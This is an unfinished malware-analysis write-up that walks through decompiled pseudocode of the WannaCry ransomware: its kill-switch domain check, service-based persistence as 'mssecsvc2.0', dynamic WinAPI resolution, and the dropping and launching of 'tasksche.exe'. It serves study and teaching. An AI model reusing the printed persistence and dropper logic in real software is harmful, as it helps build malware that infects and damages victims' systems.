# why reverse wannacry, when there's already so many posts out there?
I've been learning x86-64 assembly lately, and I wanted to apply my learning already. so yeah, that's all.

## entrypoint
before finding the entrypoint of the malware, we can tell that this malware is written in C/C++ by looking at the symbols where it's using functions like memcpy, strncpy, etc.


<img width="320" height="627" alt="image" src="https://github.com/user-attachments/assets/387ba9cb-c554-413b-8090-b48bf1349954" />


now looking at **_start**, looking at line **57** we can see here that it's calling to a function, so this is most likely the entrypoint I already renamed it to **main()**
```c
  53 @ 00409b3a  uint32_t wShowWindow_1 = wShowWindow
  54 @ 00409b3b  char* var_90 = esi
  55 @ 00409b3c  int32_t var_94_1 = 0
  56 @ 00409b44  HMODULE var_98_1 = GetModuleHandleA(lpModuleName: nullptr)
  57 @ 00409b45  main()
```

Now, let's look at our **main()** function. I already renamed these variables, so you can understand it but I'm still going to explain these.
```c
int32_t main()

    void variableContainingURL
    char* AnotherVariableContainingURL
    char* VariableContainingURL

    VariableContainingURL,
    AnotherVariableContainingURL =
        __builtin_memcpy(
            dest: &variableContainingURL,
            src: "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com",
            count: 56
        )

    *VariableContainingURL = *AnotherVariableContainingURL

    // I don't know what this variable is used for yet, but memset is zeroing out this variable. Let's get back to this later.
    int32_t var_17
    __builtin_memset(dest: &var_17, ch: 0, count: 23)

    // Create a handle so we can use WINInet functions
    int32_t hInternet =
        InternetOpenA(
            lpszAgent: nullptr,
            dwAccessType: 1, // (INTERNET_OPEN_TYPE_DIRECT) I assume that the function as this access type so it'll bypass proxy configurations
            lpszProxy: nullptr,
            lpszProxyBypass: nullptr,
            dwFlags: 0
        )

    // 
    int32_t hInternet_1 =
        InternetOpenUrlA(
            hInternet,
            lpszUrl: &variableContainingURL,
            lpszHeaders: nullptr,
            dwHeadersLength: 0,

            dwFlags: 0x84000000, // INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE
                                 // https://learn.microsoft.com/en-us/windows/win32/wininet/api-flags
                                 // Meaning this'll perform a fresh download avoiding cache, and also prevent saving response to the cache
                                 // later we'll figure out what is it specificallly trying to download

            dwContext: 0
        )

    if (hInternet_1 != 0)
        InternetCloseHandle(hInternet)
        InternetCloseHandle(hInternet_1)
        return 0

    InternetCloseHandle(hInternet)
    InternetCloseHandle(0)

    stage2()

    return 0
```


## stage2
We can also see the **stage2()** function, after it performed a requets on the specified URL. (I renamed it already)
```c
BOOL stage2()

    // Get full path of the current executable, I'm assuming this is for persistence purposes
    GetModuleFileNameA(
        hModule: nullptr,
        lpFilename: &fullPathOfWannaCry,
        nSize: 0x104
    )

    // This'll execute if there's less than 2 parameters passed in the ransomware, I'm assuming this something to do with user input
    if (*__p___argc() s< 2)
        stage3()
        return 0

    SC_HANDLE eax_1 =
        OpenSCManagerA(
            lpMachineName: nullptr,
            lpDatabaseName: nullptr,
            dwDesiredAccess: 0xf003f
        )

    if (eax_1 != 0)
        SC_HANDLE hSCObject =
            OpenServiceA(
                hSCManager: eax_1,
                lpServiceName: "mssecsvc2.0",
                dwDesiredAccess: 0xf01ff
            )

        if (hSCObject != 0)
            sub_407fa0(hSCObject, 0x3c)
            CloseServiceHandle(hSCObject)

        CloseServiceHandle(eax_1)

    SERVICE_TABLE_ENTRYA serviceStartTable
    serviceStartTable.lpServiceName = "mssecsvc2.0"
    serviceStartTable.lpServiceProc = sub_408000

    int32_t var_8 = 0
    int32_t var_4 = 0

    return StartServiceCtrlDispatcherA(
        lpServiceStartTable: &serviceStartTable
    )
```

## stage3
```c
int32_t stage3()

  firstFunction() // first function
  secondFunction() // second function

  return 0
```

Let's analyze the 1st function
```c
int32_t firstFunction()

    char destinationBuffer[0x104]

    // sprintf is crafting a payload
    // destinationBuffer would look like this /pathofwannacry/wannacry.exe -m security

    sprintf(
        destinationBuffer,
        "%s -m security",
        fullPathOfWannaCry
    )

    // Establishes a connection to the service control manager on the computer itself.
    SC_HANDLE hSCManager = OpenSCManagerA(
        NULL,   // (This is set to NULL, so it'll connect to the service control manager on the computer itself)
        NULL,   // (If it is NULL, the SERVICES_ACTIVE_DATABASE database is opened by default.)
        0xF003F // SC_MANAGER_ALL_ACCESS 
    )

    if (hSCManager == 0)
        return 0

    // Create an autostart persistence of wannacry
    SC_HANDLE hService = CreateServiceA(
        hSCManager,
        "mssecsvc2.0",
        "Microsoft Security Center (2.0) Service",
        0xF01FF,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        destinationBuffer,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    )

    // Start the service 
    if (hService != 0)
        StartServiceA(hService, 0, NULL)
        CloseServiceHandle(hService)

    CloseServiceHandle(hSCManager)

    return 0
```
so this basically sets the persistence for wannacry by creating an autostart service, we can now rename this as **servicePersistence()**
```c
int32_t stage3()

  servicePersistence()  // first function
  secondFunction() // second function

  return 0
```

## secondFunction() - dynamic resolving of WinAPI functions
```c
int32_t secondFunction()

    // Retrieves a module handle for the specificied module, so we have a handle on kernel32.dll
    HMODULE hModule = GetModuleHandleW(lpModuleName: u"kernel32.dll")

    if (hModule != 0)

        // Dynamically resolve WinAPI functions
        char* lpProcName = "CreateFileA"
        dCreateProcessA = GetProcAddress( hModule, lpProcName: "CreateProcessA" )

        char* lpProcName_1 = "WriteFile"
        data_431458 = GetProcAddress( hModule, lpProcName )

        PSTR lpProcName_2 = "CloseHandle"
        data_431460 = GetProcAddress( hModule, lpProcName: lpProcName_1 )

        int32_t eax_3 = GetProcAddress( hModule, lpProcName: lpProcName_2 )

        int32_t ecx_1 = data_431478
        data_43144c = eax_3

        if (ecx_1 != 0 && data_431458 != 0 && data_431460 != 0
                && eax_3 != 0)

            HRSRC hResInfo = FindResourceA(
                hModule: nullptr,
                lpName: 0x727,
                lpType: &data_43137c
            )

            if (hResInfo != 0)

                HGLOBAL hResData = LoadResource( hModule: nullptr, hResInfo )

                if (hResData != 0)

                    int32_t eax_4 = LockResource( hResData )
                    int32_t var_260 = eax_4

                    if (eax_4 != 0)

                        uint32_t eax_5 = SizeofResource( hModule: nullptr, hResInfo )

                        if (eax_5 != 0)

                            memset( &var_207, 0, 0x100 ) 
                            memset( &var_103, 0, 0x100 )

                            char* filename = "tasksche.exe"

                            sprintf(
                                &var_208,
                                "C:\\%s\\%s",
                                "WINDOWS",
                                filename
                            )

                            sprintf(
                                &var_104,
                                "C:\\%s\\qeriuwjhrf",
                                "WINDOWS"
                            )

                            MoveFileExA(
                                lpExistingFileName: &var_208,
                                lpNewFileName: &var_104,
                                dwFlags: MOVEFILE_REPLACE_EXISTING
                            )

                            int32_t eax_6 = data_431458(
                                &var_208,
                                0x40000000,
                                0,
                                0,
                                2,
                                4,
                                0
                            )

                            if (eax_6 != 0xffffffff)

                                data_431460(
                                    eax_6,
                                    var_260,
                                    eax_5,
                                    &var_260,
                                    0
                                )

                                data_43144c(eax_6)

                                memset( &var_248, 0, 0x40 )

                                if (data_431478(
                                        0,
                                        &var_208,
                                        0,
                                        0,
                                        0,
                                        0x8000000,
                                        0,
                                        0,
                                        &var_24c,
                                        &var_25c
                                    ) != 0)

                                    data_43144c(var_258_1)
                                    data_43144c(var_25c)

    return 0
```

(in progress)
